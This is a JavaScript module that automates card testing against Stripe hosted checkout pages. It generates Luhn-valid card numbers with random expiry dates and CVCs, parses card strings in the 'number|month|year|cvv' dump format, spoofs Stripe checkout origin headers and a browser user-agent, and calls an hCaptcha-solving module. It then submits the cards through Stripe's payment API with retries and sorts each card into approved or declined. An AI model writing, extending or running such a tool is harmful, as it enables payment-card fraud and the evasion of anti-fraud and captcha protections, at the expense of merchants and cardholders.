const https = require('https');
const { parseCheckoutUrl, fetchCheckoutInfo } = require('./checkout-info');
const HCaptcha10Fallbacks = require('./hcaptcha-10-fallbacks');
const { 
    formatPaymentResponse, 
    createDetailedResponse, 
    isPaymentApproved, 
    isPaymentDeclined, 
    isPaymentPending,
    detectCardDecline,
    detectCardApproval,
    extractDeclineReason,
    extractDeclineCode
} = require('./enhanced-response-handler');
// Fallback to old handler if enhanced not available
const oldHandler = require('./response-handler').catch ? null : require('./response-handler');

function generateRandomBin() {
    const bins = [
        '424242', '400000', '510510', '555555', '222222',
        '378282', '371449', '601111', '352800', '620000'
    ];
    return bins[Math.floor(Math.random() * bins.length)];
}

// Luhn validation function
function validateLuhn(cardNumber) {
    let sum = 0;
    let shouldDouble = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
}

// Enhanced card generation with proper validation
function generateCardFromBin(bin) {
    if (!bin || typeof bin !== 'string') {
        throw new Error('Invalid BIN provided');
    }

    // Clean the BIN
    bin = bin.replace(/\D/g, '');
    
    if (bin.length < 6) {
        throw new Error('BIN must be at least 6 digits');
    }

    // Determine card length based on BIN prefix
    let targetLength = 16; // Default for most cards
    
    // American Express cards (start with 34 or 37) are 15 digits
    if (bin.startsWith('34') || bin.startsWith('37')) {
        targetLength = 15;
    }
    // Diners Club cards (start with 36, 38, 54, 55) can be 14-16 digits
    else if (bin.startsWith('36') || bin.startsWith('38')) {
        targetLength = 14;
    }

    // Generate random digits to fill up to target length - 1 (for check digit)
    let cardNumber = bin;
    while (cardNumber.length < targetLength - 1) {
        cardNumber += Math.floor(Math.random() * 10);
    }

    // Calculate Luhn check digit
    let sum = 0;
    let shouldDouble = true;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    const checkDigit = (10 - (sum % 10)) % 10;
    cardNumber += checkDigit;

    // IMPROVED: Validate Luhn checksum
    if (!validateLuhn(cardNumber)) {
        throw new Error('Generated card failed Luhn validation');
    }

    // Generate expiration date (valid for next 2-5 years)
    const currentYear = new Date().getFullYear();
    const currentMonth = new Date().getMonth() + 1;
    
    // Generate month (1-12)
    const expMonth = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
    
    // Generate year (current year + 1 to 5 years in future)
    let expYear = currentYear + Math.floor(Math.random() * 5) + 1;
    
    // If same year, make sure month is in future
    if (expYear === currentYear && parseInt(expMonth) <= currentMonth) {
        expYear += 1;
    }
    
    expYear = String(expYear).slice(-2);

    // IMPROVED: Validate expiration date is in future
    const expYearFull = parseInt('20' + expYear);
    if (expYearFull < currentYear || (expYearFull === currentYear && parseInt(expMonth) < currentMonth)) {
        throw new Error('Generated expiration date is in the past');
    }

    // Generate CVC based on card type
    let cvc;
    if (targetLength === 15) {
        // Amex uses 4-digit CVC
        cvc = String(Math.floor(Math.random() * 9000) + 1000);
    } else {
        // Other cards use 3-digit CVC
        cvc = String(Math.floor(Math.random() * 900) + 100);
    }

    // IMPROVED: Validate CVC length
    const expectedCvcLength = (targetLength === 15) ? 4 : 3;
    if (cvc.length !== expectedCvcLength) {
        throw new Error(`CVC length mismatch: expected ${expectedCvcLength}, got ${cvc.length}`);
    }

    return { cardNumber, expMonth, expYear, cvc };
}

function parseCardString(cardString) {
    const parts = cardString.split('|').map(s => s.trim());
    if (parts.length < 4) {
        throw new Error('Card format must be: number|month|year|cvv');
    }

    let [cardNumber, expMonth, expYear, cvc] = parts;

    cardNumber = cardNumber.replace(/\s/g, '');

    if (expMonth.startsWith('0')) {
        expMonth = expMonth.slice(1);
    }
    expMonth = String(parseInt(expMonth)).padStart(2, '0');

    if (expYear.length === 2) {
        expYear = '20' + expYear;
    }
    expYear = expYear.slice(-2);

    return { cardNumber, expMonth, expYear, cvc };
}

function makeStripeRequest(url, data) {
    return new Promise((resolve, reject) => {
        const body = new URLSearchParams(data).toString();

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(body),
                'Accept': 'application/json',
                'Origin': 'https://checkout.stripe.com',
                'Referer': 'https://checkout.stripe.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
            }
        };

        const req = https.request(url, options, (res) => {
            let buffer = '';
            res.on('data', chunk => buffer += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(buffer);
                    resolve({ statusCode: res.statusCode, data: parsed });
                } catch (err) {
                    reject(new Error('Invalid JSON response from Stripe'));
                }
            });
        });

        req.on('error', reject);
        req.write(body);
        req.end();
    });
}

async function createPaymentMethod({ cardNumber, expMonth, expYear, cvc, publicKey, sessionId, email, country = 'US', name = 'Test User', configId, address }) {
    const payload = {
        type: 'card',
        'card[number]': cardNumber,
        'card[cvc]': cvc,
        'card[exp_month]': expMonth,
        'card[exp_year]': expYear,
        'billing_details[name]': name,
        'billing_details[email]': email,
        'billing_details[address][country]': country,
        guid: 'NA',
        muid: 'NA',
        sid: 'NA',
        key: publicKey,
        'payment_user_agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout',
        'client_attribution_metadata[client_session_id]': sessionId,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
    };

    if (address) {
        if (address.line1) payload['billing_details[address][line1]'] = address.line1;
        if (address.city) payload['billing_details[address][city]'] = address.city;
        if (address.state) payload['billing_details[address][state]'] = address.state;
        if (address.postal_code) payload['billing_details[address][postal_code]'] = address.postal_code;
    }

    if (configId) {
        payload['client_attribution_metadata[checkout_config_id]'] = configId;
    }

    const response = await makeStripeRequest('https://api.stripe.com/v1/payment_methods', payload);
    return response;
}

async function confirmPayment({ paymentMethodId, sessionId, publicKey, expectedAmount, initChecksum, configId, jsChecksum }) {
    const payload = {
        eid: 'NA',
        payment_method: paymentMethodId,
        expected_amount: expectedAmount,
        'consent[terms_of_service]': 'accepted',
        expected_payment_method_type: 'card',
        guid: 'NA',
        muid: 'NA',
        sid: 'NA',
        key: publicKey,
        version: '90ba939846',
        init_checksum: initChecksum || '',
        passive_captcha_token: '',
        'client_attribution_metadata[client_session_id]': sessionId,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
    };

    if (configId) {
        payload['client_attribution_metadata[checkout_config_id]'] = configId;
    }

    if (jsChecksum) {
        payload.js_checksum = jsChecksum;
    }

    const response = await makeStripeRequest(
        `https://api.stripe.com/v1/payment_pages/${sessionId}/confirm`,
        payload
    );
    return response;
}

async function attemptPayment({ checkoutUrl, card, retries = 0 }) {
    // Initialize hCaptcha solver with 10 fallback methods
    const hcaptchaSolver = new HCaptcha10Fallbacks();
    const parsed = parseCheckoutUrl(checkoutUrl);
    if (!parsed.sessionId || !parsed.publicKey) {
        throw new Error('Unable to extract session or public key from checkout URL');
    }

    const { sessionId, publicKey } = parsed;

    const info = await fetchCheckoutInfo({ sessionId, publicKey });
    const expectedAmount = info.totals?.total || 0;
    const email = info.customerEmail || 'test@example.com';
    const initChecksum = info.initChecksum || '';
    const configId = info.configId || null;

    const defaultAddress = {
        line1: '1501 Gaylord Trail',
        city: 'Grapevine',
        state: 'TX',
        postal_code: '76051'
    };

    let attempts = 0;
    let lastError = null;

    while (attempts <= retries) {
        attempts++;

        const currentCard = (typeof card === 'function') ? card() : card;

        try {
            const pmResponse = await createPaymentMethod({
                ...currentCard,
                publicKey,
                sessionId,
                email,
                country: 'US',
                name: 'Test User',
                configId,
                address: defaultAddress
            });

            if (pmResponse.statusCode !== 200 || !pmResponse.data.id) {
                lastError = pmResponse.data.error || { message: 'Failed to create payment method' };
                continue;
            }

            const paymentMethodId = pmResponse.data.id;

            const confirmResponse = await confirmPayment({
                paymentMethodId,
                sessionId,
                publicKey,
                expectedAmount,
                initChecksum,
                configId
            });

            const responseData = confirmResponse.data;
            const isComplete = responseData.status === 'complete';
            const requires3DS = responseData.payment_intent && 
                               responseData.payment_intent.status === 'requires_action' &&
                               responseData.payment_intent.next_action;

            // CHECK FOR CARD DECLINE
            const isDeclined = responseData.payment_intent && 
                              responseData.payment_intent.status === 'requires_payment_method';
            const hasError = responseData.error || 
                            (responseData.payment_intent && responseData.payment_intent.last_payment_error);

            // If card is declined, return failure immediately
            if (isDeclined || hasError) {
                const errorInfo = responseData.error || responseData.payment_intent.last_payment_error || {};
                return {
                    success: false,
                    attempts,
                    card: currentCard,
                    status: 'declined',
                    error: {
                        code: errorInfo.code || 'card_declined',
                        message: errorInfo.message || 'Card was declined',
                        type: errorInfo.type || 'card_error',
                        decline_code: errorInfo.decline_code || 'generic_decline'
                    },
                    confirmation: responseData
                };
            }

            if (confirmResponse.statusCode === 200 && (isComplete || requires3DS)) {
                return {
                    success: true,
                    attempts,
                    card: currentCard,
                    status: 'approved',
                    paymentMethod: pmResponse.data,
                    requires3DS: requires3DS,
                    paymentIntent: requires3DS ? {
                        id: responseData.payment_intent.id,
                        status: responseData.payment_intent.status,
                        amount: responseData.payment_intent.amount,
                        currency: responseData.payment_intent.currency
                    } : null,
                    confirmation: responseData
                };
            }

            lastError = confirmResponse.data.error || confirmResponse.data;
        } catch (err) {
            lastError = { message: err.message };
        }
    }

    const result = {
        success: false,
        attempts,
        error: lastError
    };
    
    // Format the response with detailed status information
    return createDetailedResponse(result);
}

module.exports = {
    generateRandomBin,
    generateCardFromBin,
    parseCardString,
    createPaymentMethod,
    confirmPayment,
    attemptPayment,
    validateLuhn,
    formatPaymentResponse,
    createDetailedResponse,
    isPaymentApproved,
    isPaymentDeclined,
    isPaymentPending
};
